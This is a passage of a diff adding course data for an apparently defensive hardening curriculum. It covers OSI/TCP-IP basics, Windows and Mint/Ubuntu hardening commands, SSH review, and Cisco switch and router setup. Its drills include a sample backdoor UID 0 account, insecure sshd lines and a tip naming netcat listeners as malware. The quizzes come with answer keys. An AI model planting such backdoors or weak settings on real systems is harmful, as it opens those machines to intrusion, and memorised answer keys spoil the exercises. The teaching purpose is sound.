+     P('Networking is taught with two layered models. The <b>OSI model</b> has seven layers and is the shared vocabulary for troubleshooting ("that is a layer 2 problem"). The <b>TCP/IP model</b> has four layers and matches how the internet\u2019s protocols are actually built.'),
+     TIPS('<b>Layers 7, 6, 5: Application, Presentation, Session.</b> What programs say to each other and how it is formatted and kept going (HTTP, DNS, SSH, TLS). TCP/IP folds all three into its <b>Application</b> layer.',
+          '<b>Layer 4: Transport.</b> TCP (reliable and ordered, set up with a three-way handshake) and UDP (fast, no delivery guarantee). Port numbers live here. Unit of data: segment (TCP) or datagram (UDP).',
+          '<b>Layer 3: Network.</b> IP addresses and routing between networks; routers work here. TCP/IP calls it the <b>Internet</b> layer. Unit of data: packet.',
+          '<b>Layer 2: Data link, and Layer 1: Physical.</b> MAC addresses and frames on one local network (switches work at layer 2), then bits on copper, fiber or radio. TCP/IP groups both as <b>Network Access</b>.',
+          '<b>Encapsulation:</b> on the way out, each layer wraps the data from the layer above in its own header (layer 2 adds a trailer too). The receiver unwraps in reverse.')),
+   C('Core ideas','Understand',
+     TIPS('Networks of all sizes share the same parts: end devices, intermediary devices (switches, routers, access points), and media (copper, fiber, wireless).',
+          'Binary and decimal: an IPv4 address is 32 bits written as four decimal numbers (octets). 11000000 is 192.',
+          'Ethernet frames carry MAC addresses; IP packets carry IP addresses; segments carry port numbers.',
+          'A switch learns MAC addresses from incoming frames and forwards only where needed. ARP finds the MAC address that belongs to an IPv4 address on the local network.',
+          'Basic device configuration: hostname, passwords on console and vty lines, enable secret, a management IP on the switch, and saving the config.')),
+   C('Learning Cisco networking for free','Remember',
+     TIPS('<b>Cisco Networking Academy</b> (NetAcad) offers free self-paced courses, from networking basics upward. A free account is required.',
+          '<b>Packet Tracer</b> is Cisco\u2019s free network simulator: drag routers, switches and PCs onto a canvas, cable them, and configure them with the IOS command line. Download it after signing up on NetAcad.',
+          '<b>Configuration hygiene starts on day one.</b> Name each device exactly as the network documentation does, so prompts, logs and neighbor tables match the diagram. Router interfaces start administratively down until you enter <code>no shutdown</code>. And save with <code>copy running-config startup-config</code>, or the work vanishes on reload.')),
+   FLASH('f7fl','Networking terms',[
+     ['OSI model','Seven layers: Physical, Data link, Network, Transport, Session, Presentation, Application.'],
+     ['TCP/IP model','Four layers: Network Access, Internet, Transport, Application.'],
+     ['Encapsulation','Each layer wraps the data from the layer above in its own header on the way out.'],
+     ['MAC address','A 48-bit hardware address used inside one local network (layer 2).'],
+     ['IP address','A logical address used to route between networks (layer 3). IPv4 is 32 bits; IPv6 is 128 bits.'],
+     ['ARP','Address Resolution Protocol: finds the MAC address for an IPv4 address on the local network.'],
+     ['TCP','Connection-oriented transport: handshake, ordering, retransmission of lost data.'],
+     ['UDP','Connectionless transport: no handshake, no retransmission. Used by DNS queries, streaming and VoIP.'],
+     ['Default gateway','The router a host sends traffic to when the destination is on another network.']
+   ]),
+   QUIZ('f7q','Check: networking foundations',[
+     ['11111111.11111111.11111111.00000000 as a subnet mask is',['255.255.0.0','255.255.255.0','255.255.255.128','255.0.0.0'],1,'Eight ones per octet is 255. Three full octets of ones is /24.'],
+     ['At which OSI layer does a switch forward frames using MAC addresses?',['Layer 1','Layer 2','Layer 3','Layer 4'],1,'Data link, layer 2. Routers make layer 3 decisions with IP addresses.'],
+     ['Which layer of the TCP/IP model does IP belong to?',['Application','Transport','Internet','Network Access'],2,'IP is the Internet layer. TCP and UDP are Transport.'],
+     ['Which protocol is connection-oriented and retransmits lost data?',['UDP','TCP','IP','ARP'],1,'TCP sets up a connection (SYN, SYN-ACK, ACK), numbers the bytes and retransmits losses. UDP sends and forgets.'],
+     ['What does ARP do?',['Assigns IP addresses','Finds the MAC address that belongs to an IPv4 address on the local network','Encrypts traffic','Translates names to addresses'],1,'ARP maps IPv4 to MAC on the local segment. DHCP assigns addresses; DNS translates names.'],
+     ['What does <code>enable secret</code> protect?',['Console access','Privileged EXEC (enable) mode, with a hashed password','SSH only','The running-config file'],1,'enable secret hashes the password that guards privileged mode. enable password (no secret) is clear text and a classic Config Audit finding.']
+   ]),
+   LINKS('Go further',['netacad','pt','t4t-subnet','t4t-ios','khan'])
+  ]}
+ ]
+});
+/* ---------------------------- SOPHOMORE ---------------------------- */
+LEVELS.push({
+ id:'sophomore', grade:'Sophomore', range:'Beginner to intermediate', color:'var(--l2)', chev:2,
+ blooms:['U','A','An'], bloomCap:'Understand and apply. First analysis: reading output and spotting the risky line.',
+ intro:'You know the words. Now you do the work: read a scenario brief carefully, harden a Windows 11 machine and a Linux Mint or Ubuntu machine by hand, keep a change log, and configure your first Cisco switch and router. Every unit ends in something you can practice on a VM you own or in Lockdown Range.',
+ mentor:['Pair learners on a practice lab with the solution walkthrough closed, then open it together and write down every miss. Those misses become their checklist.','Insist on the change log from the first session. It turns a broken service from a panic into a two-minute undo.','Alternate roles each session: one drives, one reads the scenario brief and verifies each change.','Keep Lockdown Drills and Lockdown Range open next to this page: this page explains why, the drills build speed, the labs put it all together.'],
+ units:[
+ {id:'s1',title:'Read the scenario brief first',bloom:'Apply',sum:'Read the brief like a contract, learn the six hardening areas, and plan your first twenty minutes.',
+  blocks:[
+   C('How to read a scenario brief','Understand',
+     TIPS('Find and write down: the <b>authorized users</b>, who is an <b>administrator</b>, which <b>services</b> must stay running, which <b>software</b> is allowed or banned, and any <b>investigation questions</b>.',
+          'Everything not on the authorized list is suspect. Everything on it is protected: deleting an authorized user or stopping a required service fails an availability check, because you broke something the business needs.',
+          'When the brief says "this machine is the company web server", you harden the web server; you do not remove it.',
+          'The brief is your scope. If a fix would reach beyond it (another machine, a network you were not given), stop and ask.',
+          'Answer investigation questions in the exact format asked (a hash, a file path, a user name). A right answer in the wrong format is a wrong answer.'),
+     NOTE('The six hardening areas, each aligned with a CIS Critical Security Control (v8). On any operating system you are always working in one of them. The Hardening scorecard page turns them into a checklist.'),
+     {t:'areas'}),
+   QUIZ('s1q','Scenario brief: which actions are safe?',[
+     ['Brief: "Authorized users: alice, bob, carol. Administrators: alice. The company runs an FTP server for customers." You find user dave with admin rights and a running FTP service.',['Delete dave, remove FTP','Remove dave\u2019s admin rights and delete dave, harden FTP, keep it running','Keep dave, remove FTP','Leave both alone'],1,'dave is not authorized: remove. FTP is required: configure it securely (no anonymous login, strong authentication) but keep it up.'],
+     ['Brief: "bob needs Remote Desktop to work from home." Which is the right call?',['Disable Remote Desktop, it is insecure','Keep RDP enabled, require Network Level Authentication, make sure bob is in Remote Desktop Users and the firewall only allows RDP as needed','Delete bob to be safe','Open RDP to everyone'],1,'Required services stay, hardened. Removing one the brief needs is an outage.'],
+     ['An investigation question asks: "What is the SHA-256 hash of the file secret.txt on the Desktop?" Your answer should be',['The file size','The MD5 hash, it is shorter','The exact SHA-256 hex string, nothing else','The file contents'],2,'Exact format, exact algorithm. Get-FileHash -Algorithm SHA256 on Windows, sha256sum on Linux.'],
+     ['Right after your last change, an availability check fails: the company web site is down. What do you check first?',['The last change you made','The firewall in general','Windows Update','Nothing, keep going'],0,'Last change first; that is what the change log is for. Undo it, confirm the site is back, then find a fix that keeps it running.']
+   ]),
+   ORDER('s1o','Order the first twenty minutes','Put these in the order a calm team does them. Tap items from the pool to build the sequence.',[
+     ['Read the whole scenario brief and investigation questions; write down users, admins, required services','Everything else depends on it. Skipping it is how required services get broken.'],
+     ['Record a baseline (users, admins, running services, listening ports) and take a snapshot if allowed','Your before picture. Without it you cannot prove what changed.'],
+     ['Assign roles: who works this machine, who logs changes, who verifies','One driver, one scribe. Two people typing on one machine is chaos.'],
+     ['Compare users and administrators to the brief','The fastest high-impact wins on any machine; the brief tells you the right answer.'],
+     ['Fix accounts: remove unauthorized users, strip extra admins, disable guest, set passwords','Apply the comparison before you forget it.'],
+     ['Move to password and lockout policy, then firewall, then updates','The next areas, in rough order of speed and value.']
+   ]),
+   LINKS('Go further',['cis-controls','nist-csf','t4t-range'])
+  ]},
+ {id:'s2',title:'Windows 11 hardening',bloom:'Apply',sum:'Accounts, password and lockout policy, firewall, updates, Defender, services, startup, permissions, backups and unauthorized files: by hand.',
+  blocks:[
+   C('Accounts','Apply',
+     CMDS('Users and groups',[
+       ['Get-LocalUser | Select-Object Name,Enabled,PasswordRequired','Who exists, who is enabled, who has no password required.'],
+       ['Disable-LocalUser -Name Guest','Guest off. Also: net user Guest /active:no'],
+       ['Remove-LocalUser -Name mallory','Delete an unauthorized user. Also: net user mallory /delete'],
+       ['Remove-LocalGroupMember -Group Administrators -Member dave','Strip admin from an authorized-but-not-admin user. Also: net localgroup Administrators dave /delete'],
+       ['Add-LocalGroupMember -Group "Remote Desktop Users" -Member bob','Give exactly the access the scenario brief asks for.'],
+       ['net user alice *','Prompt for a new password for an account with a weak or blank one.'],
+       ['Set-LocalUser -Name alice -PasswordNeverExpires $false','Follow the same expiry policy as every other account.']
+     ])),
+   C('Password and lockout policy','Apply',
+     P('Open <code>secpol.msc</code> &gt; Account Policies (Pro and above). Or set it from an admin prompt:'),
+     CMDS('net accounts',[
+       ['net accounts /minpwlen:14 /maxpwage:365 /minpwage:1 /uniquepw:24','Length 14 (the most net accounts accepts), expire after 365 days, no change again for 1 day, remember 24 old passwords.'],
+       ['net accounts /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15','Lock for 15 minutes after 5 bad tries within 15 minutes.'],
+       ['net accounts','Verify. Complexity requirements are only in secpol.msc > Password Policy (set to Enabled).']
+     ]),
+     NOTE('<b>Standards disagree on passwords, so know both.</b> CIS Benchmarks for Windows recommend a minimum length of 14 or more, history of 24, a maximum age of 365 days or fewer, complexity on, and lockout after 5 or fewer bad tries. NIST SP 800-63B-4 (2025) says a password used on its own must be at least 15 characters, with no composition rules and no forced periodic changes (change it when there is evidence of compromise), and new passwords must be checked against a blocklist of common and breached ones. In a lab, follow the scenario brief; at work, follow your organization\u2019s policy.')),
+   C('Firewall, updates, antivirus','Apply',
+     CMDS('Three quick wins',[
+       ['Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True','All three profiles on. Then check rules in wf.msc for anything allowing everything inbound.'],
+       ['Set-NetFirewallProfile -Profile Domain,Private,Public -DefaultInboundAction Block','Default deny inbound, allow outbound (the normal posture).'],
+       ['ms-settings:windowsupdate','Run this: Settings > Windows Update. Check for updates and install them.'],
+       ['Set-MpPreference -DisableRealtimeMonitoring $false','Defender real-time protection on. Confirm in Windows Security > Virus & threat protection.'],
+       ['Update-MpSignature','Pull the latest Defender signatures.']
+     ])),
+   C('Services, startup, shares, files','Apply',
+     CMDS('Find the extras',[
+       ['Get-Service | Where-Object Status -eq Running | Select-Object Name,DisplayName,StartType','Running services. Research anything you do not recognize before stopping it.'],
+       ['Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled','Example: Print Spooler stopped and disabled on a machine that never prints (Microsoft’s own PrintNightmare workaround). Same pattern for RemoteRegistry, ftpsvc, SNMP when not required.'],
+       ['Get-NetTCPConnection -State Listen | Select-Object LocalPort,OwningProcess | Sort-Object LocalPort','What is listening. Match PIDs with Get-Process -Id &lt;pid&gt;.'],
+       ['Get-ScheduledTask | Where-Object State -ne Disabled | Select-Object TaskName,TaskPath','Scheduled tasks: malware loves these.'],
+       ['Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location','Startup entries (Run keys and Startup folders).'],
+       ['Get-SmbShare','Shares. Remove ones the scenario brief does not justify: Remove-SmbShare -Name Public'],
+       ['Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol','SMBv1 should be Disabled: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart'],
+       ['Get-ChildItem -Path C:\\Users -Recurse -Include *.mp3,*.mp4,*.mkv,*.jpg,*.png,*.exe -ErrorAction SilentlyContinue | Select-Object FullName','Media files and odd executables in user folders. Check the brief or the acceptable-use policy for what is unauthorized.'],
+       ['appwiz.cpl','Run it: uninstall unauthorized or suspicious programs (games, cracked tools, remote-access tools not in the brief).']
+     ])),
+   C('Permissions, UAC and backups','Apply',
+     CMDS('Check the guard rails',[
+       ['icacls "C:\\Shared"','Who can do what to a folder. Look for Everyone or Users with (F) full control or (M) modify where they do not belong.'],
+       ['icacls "C:\\Shared" /inheritance:d','Stop inheriting from the parent, keeping copies of the inherited entries so you can edit them.'],
+       ['icacls "C:\\Shared" /remove Everyone','Remove the explicit entries for Everyone.'],
+       ['icacls "C:\\Shared" /grant "Finance:(OI)(CI)M"','Give the Finance group Modify on the folder and everything inside it. Quote the grant in PowerShell because of the parentheses.'],
+       ['secpol.msc','Local Policies > Security Options: "User Account Control: Run all administrators in Admin Approval Mode" should be Enabled (the default).'],
+       ['wbadmin start backup -backupTarget:E: -include:C: -allCritical -quiet','Built-in image backup (Windows 11 and Windows Server): back up C: plus everything needed for bare-metal recovery to drive E:.']
+     ]),
+     TIPS('<b>Backups</b> are their own CIS Control (11: Data Recovery). File History or a backup tool copies personal files to another drive; servers back up volumes and system state. A backup you have never restored is a hope, not a backup.',
+          'Snapshots and backups are different: a snapshot rolls a VM back; a backup survives the loss of the disk.')),
+   SPOT('s2sp','Spot the problems: net accounts','The brief says to follow the CIS Benchmark. Tap every line that is a finding, then Check.',[
+     ['Force user logoff how long after time expires?:       Never',null],
+     ['Minimum password age (days):                          0','Users can change a password and immediately change it back, defeating history. CIS: 1 or more.'],
+     ['Maximum password age (days):                          Unlimited','Passwords never expire. CIS: 365 or fewer. (NIST SP 800-63B-4 drops forced changes, but this brief follows CIS.)'],
+     ['Minimum password length:                              0','Blank passwords allowed. CIS: 14 or more.'],
+     ['Length of password history maintained:                None','Old passwords can be reused. CIS: 24.'],
+     ['Lockout threshold:                                    Never','Unlimited guesses. CIS: 5 or fewer, but not 0.'],
+     ['Lockout duration (minutes):                           30',null],
+     ['Lockout observation window (minutes):                 30',null],
+     ['Computer role:                                        WORKSTATION',null]
+   ]),
+   LAB('s2lab','Lab: harden a Windows VM you own','Use a snapshot first. Tick each step as you do it, and write each change in your log.',[
+     ['Take a snapshot named "before hardening".',null],
+     ['Disable Guest and confirm it shows Enabled: False.','Disable-LocalUser -Name Guest; Get-LocalUser Guest'],
+     ['Create a test user, give it admin, then remove the admin membership again.','Add-LocalGroupMember -Group Administrators -Member test; Remove-LocalGroupMember -Group Administrators -Member test'],
+     ['Set password length, age, history and lockout, then verify.','net accounts /minpwlen:14 /maxpwage:365 /minpwage:1 /uniquepw:24 /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15; net accounts'],
+     ['Enable complexity in secpol.msc > Account Policies > Password Policy.','secpol.msc'],
+     ['Turn every firewall profile on with default inbound Block.','Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True -DefaultInboundAction Block'],
+     ['Confirm Defender is on and signatures are current.','Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusSignatureLastUpdated'],
+     ['List listening ports and explain each one in your log.','Get-NetTCPConnection -State Listen | Select-Object LocalPort,OwningProcess'],
+     ['Create a folder, break inheritance, and give one group Modify.','icacls "C:\\Shared" /inheritance:d'],
+     ['Revert to the snapshot and do it again, faster.',null]
+   ]),
+   LINKS('Go further',['ms-win-sec','ms-baselines','ms-icacls','ms-sysint','nist-63b','t4t-ld-win11','t4t-lr-win'])
+  ]},
+ {id:'s3',title:'Linux Mint and Ubuntu hardening',bloom:'Apply',sum:'Users, sudo, passwords, ufw, apt, services, SSH, unauthorized files and snapshots: the Linux half of hands-on hardening.',
+  blocks:[
+   C('Mint and Ubuntu: same base, different tools','Understand',
+     TIPS('<b>Updates.</b> Ubuntu uses Software Updater and <code>unattended-upgrades</code>; Mint uses <b>Update Manager</b>, which can also apply updates automatically (Edit &gt; Preferences &gt; Automation). Both sit on <code>apt</code>, so <code>sudo apt update &amp;&amp; sudo apt upgrade</code> works on either.',
+          '<b>Firewall.</b> Both include <code>ufw</code>. Mint adds a graphical Firewall Configuration tool (gufw); Ubuntu Desktop does not install one by default.',
+          '<b>Snapshots.</b> Mint\u2019s Update Manager asks you to set up <b>Timeshift</b>, which snapshots system files (home folders are excluded by default). For personal files, use a backup tool such as Ubuntu\u2019s Déjà Dup or Mint\u2019s Backup Tool.',
+          '<b>Software.</b> Ubuntu installs some apps as Snaps; Mint disables Snap by default and prefers .deb packages and Flatpak.')),
+   C('Accounts and sudo','Apply',
+     CMDS('Compare to the scenario brief, then act',[
+       ['awk -F: \'$3 >= 1000 && $3 < 65534 {print $1}\' /etc/passwd','Human accounts.'],
+       ['getent group sudo','Administrators on Mint/Ubuntu/Debian.'],
+       ['sudo deluser --remove-home mallory','Remove an unauthorized user and the home directory. (Generic Linux: sudo userdel -r mallory)'],
+       ['sudo gpasswd -d dave sudo','Remove dave from the sudo group (keeps the user).'],
+       ['sudo usermod -aG sudo alice','Add alice to sudo. -a (append) matters: without it you replace all her groups.'],
+       ['sudo passwd -l hacker','Lock an account you are not sure about instead of deleting it.'],
+       ['sudo passwd bob','Set a strong password for an account with a weak one.'],
+       ['sudo visudo','Edit sudoers safely. Look for ALL=(ALL) NOPASSWD: ALL and unknown entries, and check /etc/sudoers.d/.']
+     ])),
+   C('Password policy','Apply',
+     CMDS('Aging and quality',[
+       ['sudo nano /etc/login.defs','Set PASS_MAX_DAYS 365, PASS_MIN_DAYS 1, PASS_WARN_AGE 7 (or what your policy says). Applies to new accounts.'],
+       ['sudo chage -M 365 -m 1 -W 7 alice','Apply the same aging to an existing user. sudo chage -l alice to view.'],
+       ['sudo apt install libpam-pwquality','Password quality module.'],
+       ['sudo nano /etc/pam.d/common-password','On the pam_pwquality.so line add: retry=3 minlen=14. Add character-class rules (ucredit=-1 and so on) only if your policy requires them; NIST SP 800-63B-4 advises against composition rules.'],
+       ['sudo nano /etc/security/faillock.conf','Lockout with pam_faillock (current Ubuntu, Mint and Debian): deny = 5 and unlock_time = 900, then enable pam_faillock as man faillock describes.']
+     ]),
+     NOTE('Snapshot before PAM edits. A typo in common-password or common-auth can lock everyone out, including you.',true)),
+   C('Firewall, updates, services','Apply',
+     CMDS('ufw, apt, systemd',[
+       ['sudo ufw default deny incoming','Nothing in unless allowed.'],
+       ['sudo ufw default allow outgoing','Normal outbound traffic.'],
+       ['sudo ufw allow 22/tcp','Only if the brief needs SSH. Same pattern for 80/tcp, 443/tcp.'],
+       ['sudo ufw enable','Turn it on. sudo ufw status verbose to confirm.'],
+       ['sudo apt update && sudo apt upgrade -y','Patch everything. Check Update Manager (Mint) or Software & Updates (Ubuntu) for sources and automatic updates.'],
+       ['sudo apt install unattended-upgrades && sudo dpkg-reconfigure -plow unattended-upgrades','Automatic security updates on.'],
+       ['sudo ss -tulnp','Listening TCP and UDP sockets with the owning process.'],
+       ['systemctl list-units --type=service --state=running','Running services.'],
+       ['sudo systemctl disable --now vsftpd','Stop and disable a service the brief does not need. Then sudo apt purge vsftpd to remove it.'],
+       ['sudo apt purge telnetd','Remove clearly insecure packages (telnetd, rsh-server) unless required.'],
+       ['sudo timeshift --create --comments "before hardening"','Mint: a system snapshot from the command line before risky changes.']
+     ])),
+   C('SSH and unauthorized files','Apply',
+     CMDS('sshd_config and find',[
+       ['sudo nano /etc/ssh/sshd_config','Set PermitRootLogin no, PermitEmptyPasswords no, X11Forwarding no. Keep PasswordAuthentication yes unless the brief says keys only.'],
+       ['sudo sshd -t && sudo systemctl restart ssh','Test the config, then restart (service name ssh on Debian/Ubuntu/Mint). Check how the service starts (systemctl status ssh.socket): on Ubuntu 24.04 and Mint 22, ssh.socket holds port 22, so disabling ssh.service does not close it, and a Port change needs sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart ssh.socket.'],
+       ['sudo find / -type f \\( -iname "*.mp3" -o -iname "*.mp4" -o -iname "*.mkv" -o -iname "*.jpg" \\) 2>/dev/null','Media files anywhere. Check the brief before deleting.'],
+       ['sudo find /home -type f \\( -iname "*.sh" -o -iname "*.py" \\) 2>/dev/null','Scripts in home folders: read them.'],
+       ['sudo find / -perm -4000 -type f 2>/dev/null','SUID binaries. Compare to a clean VM; unknown ones are suspicious.'],
+       ['ls -la /home/*/.ssh','Extra authorized_keys entries are backdoors.']
+     ])),
+   SPOT('s3sp','Spot the problems: sshd_config','Tap every line that weakens the server, then Check.',[
+     ['Port 22',null],
+     ['PermitRootLogin yes','Root can log in over the network with a password. Set no.'],
+     ['PubkeyAuthentication yes',null],
+     ['PasswordAuthentication yes',null],
+     ['PermitEmptyPasswords yes','Accounts with empty passwords can log in. Set no.'],
+     ['X11Forwarding yes','Unneeded feature with a long history of abuse. Set no.'],
+     ['MaxAuthTries 100','Brute force welcome. Set 3 to 5.'],
+     ['UsePAM yes',null],
+     ['Subsystem sftp /usr/lib/openssh/sftp-server',null]
+   ]),
+   SPOT('s3sp2','Spot the problems: /etc/passwd','The brief says the authorized users are alice and bob, and the only administrator is alice. Tap the suspicious lines, then Check.',[
+     ['root:x:0:0:root:/root:/bin/bash',null],
+     ['daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',null],
+     ['alice:x:1000:1000:Alice:/home/alice:/bin/bash',null],
+     ['bob:x:1001:1001:Bob:/home/bob:/bin/bash',null],
+     ['backup:x:34:34:backup:/var/backups:/usr/sbin/nologin',null],
+     ['sysadm:x:0:0::/home/sysadm:/bin/bash','A second UID 0 account. This is root under another name: a backdoor.'],
+     ['games:x:5:60:games:/usr/games:/usr/sbin/nologin',null],
+     ['tmpuser:x:1002:1002::/home/tmpuser:/bin/bash','Not on the authorized list. Investigate and remove.']
+   ]),
+   LAB('s3lab','Lab: harden a Mint or Ubuntu VM you own','Snapshot first. Tick each step, log each change.',[
+     ['Create a test user, add it to sudo, then remove it from sudo.','sudo adduser test; sudo usermod -aG sudo test; sudo gpasswd -d test sudo'],
+     ['Set aging in /etc/login.defs and apply it to your main user with chage.','sudo chage -M 365 -m 1 -W 7 $USER; sudo chage -l $USER'],
+     ['Install pwquality and set minlen=14 in common-password, then test by trying a weak password.','sudo apt install libpam-pwquality'],
+     ['Default-deny inbound firewall, enable, verify.','sudo ufw default deny incoming; sudo ufw enable; sudo ufw status verbose'],
+     ['Patch and turn on unattended upgrades.','sudo apt update && sudo apt upgrade -y'],
+     ['List listening sockets and explain each in your log.','sudo ss -tulnp'],
+     ['Set PermitRootLogin no, test, restart SSH.','sudo sshd -t && sudo systemctl restart ssh'],
+     ['Find all SUID files and media files; note which you would remove and why.','sudo find / -perm -4000 -type f 2>/dev/null']
+   ]),
+   LINKS('Go further',['ubuntu-server','ubuntu-sec','mint-docs','cis','t4t-ld-mint','t4t-ld-ubuntu','t4t-lr-linux'])
+  ]},
+ {id:'s4',title:'Services and ports',bloom:'Understand',sum:'Which services are insecure by design, which are insecure by configuration, and how to tell "remove" from "harden".',
+  blocks:[
+   C('Remove, harden, or keep','Understand',
+     TIPS('<b>Insecure by design</b> (clear-text credentials): Telnet (23), FTP (21), rsh/rlogin (512-514), HTTP admin pages. Remove unless the brief requires them; if required, restrict and monitor.',
+          '<b>Insecure by configuration</b>: SSH with root login, Samba with guest shares, VNC with no password, RDP without NLA, SNMP with "public". Keep if required, fix the configuration.',
+          '<b>Remote access tools</b> not mentioned in the brief (TeamViewer, AnyDesk, VNC, netcat listeners) are usually unauthorized software or malware.',
+          'Rule of thumb: if you cannot say what a listening port is for, you are not done with that port.')),
+   MATCH('s4m','Match the service to its port','Tap a service, then the port it normally uses.',[
+     ['SSH','22'],['Telnet','23'],['FTP','21'],['HTTP','80'],['HTTPS','443'],['DNS','53'],['RDP','3389'],['SMB','445'],['SMTP','25'],['MySQL','3306']
+   ]),
+   QUIZ('s4q','Check: what would you do?',[
+     ['ss -tulnp shows vsftpd listening on 21. Brief: "This machine is a web server." Action?',['Keep it, it is harmless','Disable and remove vsftpd','Change the port to 2121','Add a firewall rule allowing 21'],1,'FTP is not part of the scenario. Remove it, then confirm the web server still works.'],
+     ['Brief: "Employees transfer files to this server with FTP." Action?',['Remove FTP anyway','Keep FTP, disable anonymous login, require strong passwords, restrict users to their home directories','Replace it with Telnet','Open FTP to the internet'],1,'Required service: harden it. In vsftpd.conf that means anonymous_enable=NO, local_enable=YES, chroot_local_user=YES.'],
+     ['Windows shows a listener on 5900 owned by winvnc.exe, not mentioned in the brief.',['Leave it, VNC is standard','Uninstall it and check startup and scheduled tasks for anything that re-launches it','Only block port 5900 in the firewall','Rename the process'],1,'Unlisted remote-access software is an unauthorized-software or malware finding. Remove it and its persistence.'],
+     ['Which is the usual default firewall posture for a workstation or server?',['Block everything in and out','Default deny inbound, allow outbound, open only required inbound ports','Allow everything, the OS handles it','Block outbound only'],1,'Blocking all outbound traffic would break updates, DNS and everything users need. Tighter outbound filtering is possible, but it has to be planned service by service.']
+   ]),
+   LINKS('Go further',['ubuntu-server','ms-win-sec','cis'])
+  ]},
+ {id:'s5',title:'Cisco: configure a switch and a router',bloom:'Apply',sum:'The baseline IOS commands for a new switch and router, why each one matters, and how to verify them.',
+  blocks:[
+   C('Baseline switch configuration','Apply',
+     CMDS('From user mode to a saved config',[
+       ['enable','User EXEC (>) to privileged EXEC (#).'],
+       ['configure terminal','Global configuration mode (config)#.'],
+       ['hostname SW1','Match the name in your network documentation exactly; it appears in prompts, logs and neighbor tables.'],
+       ['enable secret Cisco123!','Hashed password for privileged mode (never enable password).'],
+       ['service password-encryption','Obscures the clear-text line passwords in the config (weak, but better than plain text).'],
+       ['banner motd #Authorized access only#','Legal notice. The delimiter character must not appear in the text.'],
+       ['line console 0','Then: password Cisco123! and login. exit to leave.'],
+       ['line vty 0 15','Remote lines. Then: login local and transport input ssh.'],
+       ['username admin secret Cisco123!','Local account used by login local.'],
+       ['ip domain-name example.com','Required before generating the SSH key.'],
+       ['crypto key generate rsa modulus 2048','SSH key pair.'],
+       ['ip ssh version 2','SSH version 2 only.'],
+       ['interface vlan 1','Management interface (real networks usually move management off VLAN 1). Then: ip address 192.168.1.2 255.255.255.0 and no shutdown.'],
+       ['ip default-gateway 192.168.1.1','So the switch can be managed from other networks.'],
+       ['copy running-config startup-config','Save to NVRAM. Unsaved changes vanish on reload.']
+     ])),
+   C('Baseline router configuration','Apply',
+     CMDS('Interfaces and verification',[
+       ['interface gigabitethernet0/0/0','Then: description LAN, ip address 192.168.1.1 255.255.255.0, no shutdown.'],
+       ['show ip interface brief','Interface status and addresses. up/up is the goal.'],
+       ['show running-config','What is configured now. show startup-config is what is saved.'],
+       ['show vlan brief','Switch: VLANs and port assignments.'],
+       ['show mac address-table','Switch: learned MAC addresses.'],
+       ['ping 192.168.1.10','Verify from the device. Also from a PC: ping its gateway.'],
+       ['exec-timeout 5 0','Under line console/vty: log out idle sessions after 5 minutes.']
+     ])),
+   QUIZ('s5q','Check: IOS',[
+     ['You configured an IP address on interface vlan 1 but the switch still cannot be pinged. Most likely missing?',['enable secret','no shutdown on the interface','service password-encryption','a banner'],1,'The interface is still down. no shutdown brings it up. Check with show ip interface brief.'],
+     ['Which command makes the vty lines use the local username database?',['login','login local','password cisco','transport input ssh'],1,'login alone uses the line password; login local uses username/secret entries.'],
+     ['The switch reloaded and your configuration is gone. What was missed?',['enable secret','copy running-config startup-config','show vlan brief','exec-timeout'],1,'The running-config lives in RAM. Save it to NVRAM (the startup-config) or it is lost on reload.'],
+     ['Why enable secret rather than enable password?',['It is shorter','enable secret stores a hash; enable password is clear text or weakly reversible','They are the same','enable password is newer'],1,'Config Audit will show you this one in the wild: an enable password line is a finding.']
+   ]),
+   LINKS('Go further',['t4t-ios','t4t-audit','t4t-ld-ios','t4t-lr-ios','netacad','pt'])
+  ]},
+ {id:'s6',title:'Investigation questions and the change log',bloom:'Apply',sum:'How to answer exactly, the commands that find things, and the one habit that makes every teammate better.',
+  blocks:[
+   C('Answering an investigation question','Understand',
+     TIPS('Read the whole question twice. Note the <b>exact format</b> requested: hash algorithm, full path or just a name, user name or UID, date format.',
+          'Write the answer where the question file asks (often an <code>ANSWER:</code> line), exactly as asked; do not change anything else in that file.',
+          'Typical asks: find a file by name or content, hash a file, identify the user who owns or created something, find a process or listening port, decode text, read a log entry.',
+          'If it feels like a trick, it is usually a format trick (MD5 vs SHA-256, with or without the extension).'),
+     CMDS('Finding and fingerprinting',[
+       ['Get-ChildItem -Path C:\\ -Recurse -Filter "secret*" -ErrorAction SilentlyContinue','Windows: find by name. Add -Force to include hidden.'],
+       ['Get-FileHash -Algorithm SHA256 C:\\Users\\alice\\Desktop\\secret.txt','Windows hash. -Algorithm MD5 for MD5.'],
+       ['Select-String -Path C:\\Users\\*\\*.txt -Pattern "flag"','Windows: search inside text files.'],
+       ['Get-WinEvent -LogName Security -MaxEvents 200 | Where-Object Id -eq 4720','Windows: user-created events. 4624 logon, 4625 failed logon, 4732 added to a local group.'],
+       ['sudo find / -iname "secret*" 2>/dev/null','Linux: find by name.'],
+       ['sudo grep -rin "flag" /home /var/log 2>/dev/null','Linux: find by content, recursive, case-insensitive, with line numbers.'],
+       ['sha256sum file.txt','Linux hash. md5sum file.txt for MD5.'],
+       ['stat file.txt','Owner, permissions, timestamps.'],
+       ['echo "ZmxhZw==" | base64 -d','Decode base64 text.'],
+       ['last -n 20','Recent logins. lastlog for the last login of each user. Debian 13 dropped both: use lslogins, or install wtmpdb and lastlog2.']
+     ])),
+   C('The change log','Apply',
+     P('A change log is a text file (on the host, or on paper) with one line per change: <b>time, machine, what you changed, how to undo it</b>. It turns a broken service into a two-minute fix, and it becomes the raw material for your checklist afterward.'),
